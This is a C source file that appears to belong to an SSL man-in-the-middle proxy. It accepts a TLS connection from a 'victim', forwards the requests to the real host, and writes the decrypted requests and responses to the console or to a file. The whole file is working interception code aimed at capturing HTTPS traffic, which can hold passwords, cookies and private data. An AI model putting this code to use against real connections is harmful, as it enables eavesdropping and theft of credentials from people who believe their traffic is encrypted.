#include <openssl/ssl.h>
#include <openssl/err.h>
#include <err.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "ProxyMITM.h"
#include "SSL.h"
#include "HttpParser.h"

void proxy_init(int *victim_fd, SSL_CTX* ssl_context)
{
    SSL* ssl_victim_fd = ssl_init_server_connection(victim_fd, ssl_context); // Init connection with the victim as server

    /*if(!ssl_victim_fd || !ssl_target_host_fd)
        err(1, "Problem while initializing vhost and victim in proxy_init");*/

    char buffer[8192],
        bufferToWrite[8192] = "";

    int totalBytes = 0, bytesRead;

    bytesRead = construct_request(bufferToWrite, buffer, ssl_victim_fd);

    if (bytesRead <= 0)
        err(1, "No bytes read from client!");

    if(strlen(vhost) <= 0)
    {
        printf("No vhost found to connect to. Exiting...");
        exit(0);
    }

    SSL* ssl_target_host_fd = ssl_init_client_connection(vhost); // Init connection with target vhost as client

    // for debug
    //change_host(bufferToWrite, vhost);

    if (ssl_write(ssl_target_host_fd, bufferToWrite, sizeof(bufferToWrite)) != sizeof(bufferToWrite)) { puts("Could not write all bytes to server"); }

    if (dump_mode != 3)
    {
        if (output_file_fd > 0)
        {
            if (write(output_file_fd, bufferToWrite, bytesRead) <= 0)
                err(1, "Could not write request to output file");
        }
        else
            puts(bufferToWrite);
    }

    totalBytes = 0;

    while((bytesRead = ssl_read(ssl_target_host_fd, buffer, sizeof(buffer))) > 0)
    {
        if (ssl_write(ssl_victim_fd, buffer, bytesRead) != bytesRead)
            err(1, "Could not write all bytes to victim");

        if (dump_mode != 2)
        {
            if (output_file_fd > 0)
            {
                if (write(output_file_fd, buffer, bytesRead) <= 0)
                    err(1, "Could not write response to output file");
            }
            else
                puts(buffer);
        }

        /*if (strstr(buffer, "\r\n\r\n") != NULL) {
            //break;
        }*/
        totalBytes += bytesRead;
    }

    //ssl_close(ssl_target_host_fd);
    ssl_close(ssl_victim_fd);

}
